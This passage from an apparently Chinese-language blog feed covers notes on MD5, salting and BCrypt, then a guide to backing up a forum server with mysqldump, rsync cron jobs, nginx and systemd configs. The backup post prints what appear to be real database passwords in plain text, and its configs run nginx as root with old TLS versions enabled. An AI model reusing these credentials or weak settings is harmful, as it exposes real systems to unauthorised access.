class="line">&#125;</span><br></pre></td></tr></table></figure><p>IdempotentConfig</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 幂等功能配置</span><br><span class="line"> *</span><br><span class="line"> * @author Lion Li</span><br><span class="line"> */</span><br><span class="line">@AutoConfiguration(after = RedisConfiguration.class)</span><br><span class="line">public class IdempotentConfig &#123;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public RepeatSubmitAspect repeatSubmitAspect() &#123;</span><br><span class="line">        return new RepeatSubmitAspect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>resources&#x2F;META-INF.spring 目录下</p><p>org.springframework.boot.autoconfigure.AutoConfiguration.imports</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.dromara.common.idempotent.config.IdempotentConfig</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学学习</title>
    <link href="/2023/12/19/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/12/19/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>密码学在生活中用的很广泛，在设计系统中同样也很广泛，在设计系统的时候免不了需要加解密的工作，对于加解密有着很多算法，花了点时间学习记录一下。</p><h2 id="常用加密技术"><a href="#常用加密技术" class="headerlink" title="常用加密技术"></a>常用加密技术</h2><p>加密技术是对信息进行编码和解码的技术，编码是把原来可读信息（又称明文）译成代码形式（又称密文），其逆过程就是解码（解密），加密技术的要点是加密算法，加密算法可以分为三类：</p><ul><li>对称加密，如 AES、SM4（国密）<ul><li>基本原理：将明文分成N个组，然后使用密钥对各个组进行加密，形成各自的密文，最后把所有的分组密文进行合并，形成最终的密文。</li><li>优势：算法公开、计算量小、加密速度快、加密效率高</li><li>缺陷：双方都使用同样密钥，安全性得不到保证</li></ul></li><li>非对称加密，如 RSA、git的ssh公钥和私钥<ul><li>基本原理：同时生成两把密钥：私钥和公钥，私钥隐秘保存，公钥可以下发给信任客户端 私钥是用于加密的，公钥是用于解密的。<ul><li>私钥加密，持有私钥或公钥才可以解密</li><li>公钥加密，持有私钥才可解密</li></ul></li><li>优点：安全，难以破解</li><li>缺点：算法比较耗时</li><li>非对称算法一般是用来传送对称加密算法的密钥</li></ul></li><li>不可逆加密，如 MD5，SHA<ul><li>基本原理：加密过程中不需要使用密钥，输入明文后由系统直接经过加密算法处理成密文，这种加密后的数据是无法被解密的，无法根据密文推算出明文。</li></ul></li></ul><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在设计后端的时候，常常需要对用户的密码进行加密处理，避免将明文直接存贮在数据库中，因为这样的话发生数据库泄露会带来极大的危害，社工者会拿到用户的常用密码。而常用的加密方式即为使用md5算法对明文进行处理。</p><p>md5为消息摘要算法，是一种被广泛使用的密码散列函数，一般为128位的散列值。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>这种算法已经被王小云团队破解抗碰撞性，即给定一个密码A，对应的md5值为A’，可以通过某种方法构造一个密码B来让其md5值同样为A’。这一点似乎在加密认证上没什么影响，但在多年前就有人通过彩虹表等方式进行碰撞破解md5加密，这种加密不再安全。为了提升加密的安全性，便有了加盐这种方式。</p><p><strong>在密码学中，是指通过在密码任意固定位置插入特定的字符串，让散列后的结果和使用原始密码的散列结果不相符，这种过程称之为“加盐”。</strong></p><p>盐值一般是随机生产，然后存储在数据库的表中，这样可以有效减免暴力破解和彩虹表工具，使攻击者成本极大增加。</p><h2 id="BCrypt"><a href="#BCrypt" class="headerlink" title="BCrypt"></a>BCrypt</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Bcrypt算法是一种密码哈希函数，它采用了salt和cost两种机制来增强密码的安全性。</p><ul><li>salt: 为了防止彩虹表攻击，Bcrypt算法会生成一个随机salt值，将salt与密码拼接后再进行哈希运算。这个salt值是由22个可打印字符组成的字符串，它的作用是使得相同密码的哈希值在不同的salt值下产生不同的结果，从而增加密码破解的难度。</li><li>cost: Bcrypt算法会将明文密码和salt进行多次迭代的哈希运算。迭代的次数是由cost值决定的，cost值越大，运算次数越多，从而增加密码破解的难度。通常来说，建议将cost值设置为12，这样可以保证安全性和性能的平衡。</li></ul><p>在SpringSecurity中默认加密的方法为BCryptPasswordEncoder，其采用的就是BCrypt加密算法。</p><h3 id="匹配过程"><a href="#匹配过程" class="headerlink" title="匹配过程"></a>匹配过程</h3><p>在 BCrypt 算法中，存储的密文的格式包含了所有必要的信息，包括算法标识、cost 参数、盐值和加密后的密码。这种格式是由 BCrypt 算法设计的，以便在验证密码时能够正确提取盐值。</p><p>具体格式为：<code>$2a$&lt;cost&gt;$&lt;salt&gt;&lt;hash&gt;</code>。</p><ul><li><code>$2a$</code>: 表示使用的是 BCrypt 算法。</li><li><code>&lt;cost&gt;</code>: 是 cost 参数，指示算法迭代的次数。</li><li><code>&lt;salt&gt;</code>: 是盐值，是一个长度为 22 个字符的随机字符串。</li><li><code>&lt;hash&gt;</code>: 是加密后的密码。</li></ul><p>BCryptPasswordEncoder 在验证密码时，会自动从存储的密文中提取盐值，然后使用提取的盐值和用户输入的密码进行再次加密，最后将结果与存储的密文进行比较。</p><p>这样的设计是为了确保密码验证的安全性。即使相同的密码多次加密得到的密文不同，但通过存储的密文中提取的盐值，BCryptPasswordEncoder 能够准确还原加密过程，确保正确验证密码。因此，即便每次加密的密文都不同，但通过提取的盐值，验证过程依然是可靠的。这也是 BCrypt 算法的一项特性，有助于提高密码的安全性。</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>在使用 BCryptPasswordEncoder 的时候可能会导致性能问题（具体为加密耗时大量增加，而匹配耗时相差无几），这一点就是为了增强安全性而设计了，让计算速度变慢可以增大破解难度。同时也增大了服务器成本。这一点也是BCrypt和加盐的md5算法的区别。</p><h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p>在学习了一些web项目后，对于程序中的数据安全存储有了点感悟。<br>感觉一个安全性良好的程序应该做到这几点：</p><ul><li>数据在日志中以及传输给前端展示时需要做好脱敏，对身份证、手机号等信息进行处理</li><li>数据在存储在数据库中时需要做好加密处理，在从数据库中取数据时需要进行解密，最好别将明文存储在数据库中。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>论坛备份</title>
    <link href="/2023/11/28/%E8%AE%BA%E5%9D%9B%E5%A4%87%E4%BB%BD/"/>
    <url>/2023/11/28/%E8%AE%BA%E5%9D%9B%E5%A4%87%E4%BB%BD/</url>
    
    <content type="html"><![CDATA[<p>60服务器部署的web服务主要有2个，分别是论坛和补丁仓库</p><p>论坛采用的开源项目“巡云轻论坛”中的pro版本，所用技术为 SpringBoot+Mysql，前端代码应该有修改，我没拿到源码，只从服务器上找到了打包后的disk文件夹，这个开源项目有很多版本，但文档比较紊乱。</p><p>补丁仓库采用的开源项目“RuoYi”后台管理系统，所用技术同样为SpringBoot+Mysql，前端是另外写的一套，不清楚使用技术，但部署是采用Apache tomcat。这个开源项目的维护比较好，文档比较清晰。</p><p>这篇文章只讲解论坛的备份，关于补丁仓库的备份后面再说，因为补丁仓库我有重构一个版本，修改为docker部署，备份方式会有变动。</p><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>两个web服务共用一个数据库，采用两个不同的用户和database。</p><ul><li><p>数据库的root用户密码为 TVI8@techvision</p></li><li><p>论坛的用户为tech，密码为TVI1@techvision，所用的database名字也为tech</p></li><li><p>补丁仓库的用户为techvision，密码为Techvision8888，所用的database的名字也为techvision</p></li></ul><p>所以备份的时候直接把这一整个MySQL数据库备份就好了</p><p>所备份的内容仅为数据，MySQL数据库并没有进行额外的配置，采用默认配置就行了，数据库的版本我使用8.0.35 可以正常使用。</p><h3 id="备份方式"><a href="#备份方式" class="headerlink" title="备份方式"></a>备份方式</h3><p>全量备份：采用 mysqldump 工具将mysql中的所有数据库、表导出到一个sql中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">备份命令：</span><br><span class="line">mysqldump -u root -p --all-databases --events --routines &gt; backup.sql</span><br><span class="line">还原命令：</span><br><span class="line">mysql -u root -p &lt; backup.sql</span><br></pre></td></tr></table></figure><p>MySQL还有一种备份方法是保存其binlog文件，但感觉不如输出sql文件备份方便</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>在60服务器上只有补丁仓库有用到，在60服务器上的redis并未设置密码。这里跳过。</p><h2 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h2><p>在60服务器上只有补丁仓库的前端有用到，这里跳过。</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>在60服务器上只有论坛有用到，需要备份。</p><p>主要的配置文件：</p><p>nginx.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">user root;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">worker_connections 768;</span><br><span class="line"># multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Basic Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">sendfile on;</span><br><span class="line">tcp_nopush on;</span><br><span class="line">#tcp_nodelay on;</span><br><span class="line">keepalive_timeout 65;</span><br><span class="line">types_hash_max_size 2048;</span><br><span class="line"># server_tokens off;</span><br><span class="line"></span><br><span class="line"># server_names_hash_bucket_size 64;</span><br><span class="line"># server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">include /etc/nginx/mime.types;</span><br><span class="line">default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># SSL Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Logging Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Gzip Settings</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">gzip on;</span><br><span class="line"></span><br><span class="line"># gzip_vary on;</span><br><span class="line"># gzip_proxied any;</span><br><span class="line"># gzip_comp_level 6;</span><br><span class="line"># gzip_buffers 16 8k;</span><br><span class="line"># gzip_http_version 1.1;</span><br><span class="line"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># Virtual Host Configs</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">include /etc/nginx/conf.d/*.conf;</span><br><span class="line">#include /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#mail &#123;</span><br><span class="line">## See sample authentication script at:</span><br><span class="line">## http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="line"># </span><br><span class="line">## auth_http localhost/auth.php;</span><br><span class="line">## pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="line">## imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="line"># </span><br><span class="line">#server &#123;</span><br><span class="line">#listen     localhost:110;</span><br><span class="line">#protocol   pop3;</span><br><span class="line">#proxy      on;</span><br><span class="line">#&#125;</span><br><span class="line"># </span><br><span class="line">#server &#123;</span><br><span class="line">#listen     localhost:143;</span><br><span class="line">#protocol   imap;</span><br><span class="line">#proxy      on;</span><br><span class="line">#&#125;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bbs.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">## api请求端口服务块</span><br><span class="line">server&#123;</span><br><span class="line">listen  8082;</span><br><span class="line">server_name localhost 192.168.120.60;</span><br><span class="line">location /&#123;</span><br><span class="line">#请填写具体域名  解决服务端返回401等错误时浏览器报跨域错误。nginx 转发 server 响应的过程中，add_header 只有在 200,201,204,206,301,302,303,304,307 状态码时会添加，而 401、500，都没有添加。解决：在 add_header 最后加上 always，可以让 nginx 在非默认状态码下 add_header 也可以生效。</span><br><span class="line"></span><br><span class="line">add_header &quot;Access-Control-Allow-Origin&quot;  &quot;http://192.168.120.60&quot; always;</span><br><span class="line">add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot; always;</span><br><span class="line">add_header &quot;Access-Control-Allow-Methods&quot; &quot;GET, POST, PUT, OPTIONS, HEAD&quot; always;</span><br><span class="line">add_header &quot;Access-Control-Allow-Headers&quot; &quot;Origin,X-Requested-With,Content-Type,Cache-Control,Accept,Authorization,BBS-XSRF-TOKEN,Set-Cookie&quot; always;</span><br><span class="line">#预检命令的缓存，如果不缓存每次会发送两次请求</span><br><span class="line">add_header Access-Control-Max-Age 3600 always;</span><br><span class="line"></span><br><span class="line">if ($request_method = &#x27;OPTIONS&#x27;) &#123;</span><br><span class="line">return 204;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client_max_body_size 100M; #允许上传文件大小,默认是1M</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">       proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        proxy_pass $scheme://192.168.120.60:8081;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## 前端静态资源模块</span><br><span class="line">server&#123;</span><br><span class="line">listen  80;</span><br><span class="line">server_name 192.168.120.60;</span><br><span class="line">set $mobile_rewrite do_not_perform;</span><br><span class="line"></span><br><span class="line">if ($http_user_agent ~* &quot;(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|com.cnpal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino&quot;) &#123;</span><br><span class="line">set $mobile_rewrite perform;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($http_user_agent ~* &quot;^(1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-)&quot;) &#123;</span><br><span class="line">set $mobile_rewrite perform;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /&#123;</span><br><span class="line">root /home/v2/resources/tomcat/5.8/pc/dist;</span><br><span class="line"></span><br><span class="line"># 配置默认的主页显示</span><br><span class="line">location / &#123;</span><br><span class="line">try_files $uri $uri/ /index.html;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了这两个配置文件外还需要对应的前端静态文件，在60服务器上为：<code>/home/v2/resources/tomcat/5.8/pc/dist</code></p><p>这里还需要将一些静态文件中的ip地址进行替换，在60服务器上是192.168.120.60，根据新服务器的ip替换对应的ip，详情见附录。</p><h2 id="后端服务"><a href="#后端服务" class="headerlink" title="后端服务"></a>后端服务</h2><p>论坛和补丁仓库的后端服务都是启动一个jar包即可。</p><p>论坛中的jar包为：<code>/home/v2/resources/tomcat/5.8/bbs-pro-5.8.jar</code></p><p>除了这个jar包，同级目录下的其他文件也需要备份，因为里面涉及到论坛上传的文件等资源，十分重要。</p><p><code>/home/v2/resources/tomcat/5.8/</code>这个目录下的所有文件均需要拷贝出来。</p><p>最后将服务写成一个service，添加开机启动即可。</p><p>有尝试将后端服务也用docker进行，但是失败了，在拿不到源码的情况下只能将网络采用container模式，但这个模式下不知道为什么有一个请求无法获得后端响应，还是请求的配置有问题。</p><p>bbs.service:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=bbs</span><br><span class="line">After=syslog.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line">WorkingDirectory=/home/v2/resources/tomcat/5.8</span><br><span class="line">ExecStart=/usr/lib/jvm/java-8-openjdk-amd64/bin/java -Xms1024M -Xmx1024M -Dserver.port=8081 -jar /home/v2/resources/tomcat/5.8/bbs-pro-5.8.jar </span><br><span class="line">SuccessExitStatus=143</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target </span><br></pre></td></tr></table></figure><p>service服务要移动到<code>/etc/systemd/system/</code>目录才能直接启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp bbs.service /etc/systemd/system/</span><br><span class="line">sudo systemctl start bbs.service</span><br></pre></td></tr></table></figure><p>其他关于服务指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop bbs.service</span><br><span class="line">sudo systemctl restart bbs.service</span><br><span class="line"># 开机自启</span><br><span class="line">sudo systemctl enable bbs.service</span><br><span class="line"># 禁用开机自启</span><br><span class="line">sudo systemctl disable bbs.service</span><br></pre></td></tr></table></figure><p>查看服务运行后的日志：<code>sudo journalctl -u bbs.service -f</code></p><h2 id="备份定时任务"><a href="#备份定时任务" class="headerlink" title="备份定时任务"></a>备份定时任务</h2><h3 id="将文件静态备份到95服务器"><a href="#将文件静态备份到95服务器" class="headerlink" title="将文件静态备份到95服务器"></a>将文件静态备份到95服务器</h3><p>最开始的备份是将相关文件拷贝一份出去，并且能过通过拷贝的这份文件还原数据库即可，所以采用静态备份，直接将相关文件拷贝出去，具体备份如下：</p><p>备份采用的方式为：rsync，rsync 的最大特点就是它可以完成增量备份，也就是默认只复制有变动的文件。</p><p><code>crontab -e</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 每日备份MySQL （MySQL 密码存储在文件中）</span><br><span class="line">0 2 * * * mysqldump -uroot -p$(cat /home/v2/backup/mysql-password) --all-databases --events --routines &gt; /home/v2/backup/daily_backup.sql &amp;&amp; rsync -a /home/v2/backup/daily_backup.sql a58sw01@192.168.120.95:/home/a58sw01/data/learn/backup/</span><br><span class="line"></span><br><span class="line"># 存档备份MySQL，每月一次</span><br><span class="line">0 2 1 * * mysqldump -uroot -p$(cat /home/v2/backup/mysql-password) --all-databases --events --routines &gt; /home/v2/backup/$(date +\%Y\%m)_monthly_backup.sql &amp;&amp; rsync -a /home/v2/backup/$(date +\%Y\%m)_monthly_backup.sql a58sw01@192.168.120.95:/home/a58sw01/data/learn/backup/</span><br><span class="line"></span><br><span class="line"># 每日备份bbs的文件</span><br><span class="line">0 3 * * * rsync -a /home/v2/resources/tomcat/5.8/ a58sw01@192.168.120.95:/home/a58sw01/data/learn/backup/bbs_tomcat_backup/</span><br><span class="line"></span><br><span class="line"># 存档备份bbs，每月一次</span><br><span class="line">0 3 1 * * rsync -a /home/v2/resources/tomcat/5.8/ a58sw01@192.168.120.95:/home/a58sw01/data/learn/backup/tomcat_backup_$(date +\%Y\%m\%d)/</span><br></pre></td></tr></table></figure><p>这里的定时任务有两个问题：</p><p><strong>1、sudo操作需要输入密码</strong></p><p>在执行指令的时候需要sudo操作，此时可以使用 <code>visudo</code> 命令，然后添加一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username ALL=(ALL:ALL) NOPASSWD: /path/to/your/script.sh</span><br></pre></td></tr></table></figure><p>那么这个脚本执行sudo的时候就不需要输入密码了。</p><p><strong>2、采用rsync远程传输文件到其他服务器上需要其他服务器的密钥</strong></p><p>此时可以使用SSH密钥对身份进行验证。流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 生成 SSH 密钥对</span><br><span class="line">ssh-keygen -t rsa -b 2048</span><br><span class="line"># 将公钥复制到远程服务器,替换 username 和 remote_host 为你的远程服务器的用户名和主机地址。</span><br><span class="line">ssh-copy-id username@remote_host</span><br><span class="line"># 验证 SSH 配置,如果可以不需要密码直接登录则说明配置成功</span><br><span class="line">ssh username@remote_host</span><br><span class="line"># 在rsync指令中指定ssh key</span><br><span class="line">sudo rsync -avrHp -e &quot;ssh -i /home/v2/.ssh/id_rsa&quot; /var/lib/mysql/ xsr@192.168.50.124:/media/xsr/f/service-60/mysql/</span><br></pre></td></tr></table></figure><h3 id="将文件备份到50-124服务器-实现同步更新"><a href="#将文件备份到50-124服务器-实现同步更新" class="headerlink" title="将文件备份到50.124服务器 实现同步更新"></a>将文件备份到50.124服务器 实现同步更新</h3><p>后续更新了一下备份方式，现在是拷贝到另一台服务器中，并且实现自动备份同步更新。即除了拷贝相关文件之外，还需要部署起服务，并且在120.60服务器挂掉的时候能通过50.124服务器正常访问服务，访问的内容和60服务器的内容的数据相差在一天内。</p><p>这里我有尝试按照之前欧阳晓晴的文档来进行备份还原，即通过完整的拷贝&#x2F;var&#x2F;lib&#x2F;mysql目录下的文件来进行备份MySQL数据库。但最后效果并不理想，第一次根据这个数据来还原数据库成功了，但是当我第二天备份的时候，第二天的&#x2F;var&#x2F;lib&#x2F;mysql覆盖掉第一天的数据库了，数据却没有更新，依然还是第一天的数据，我在尝试重建MySQL容器的时候发送了问题，因为mysql的sock的问题导致容器创建失败，手动删除锁后又报错缺少一个文件导致容器无法创建。</p><p>该备份方式慎用，可能是因为MySQL版本或者MySQL配置或者rsync传输数据存在着问题，我后面又改成了mysqldump进行备份。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 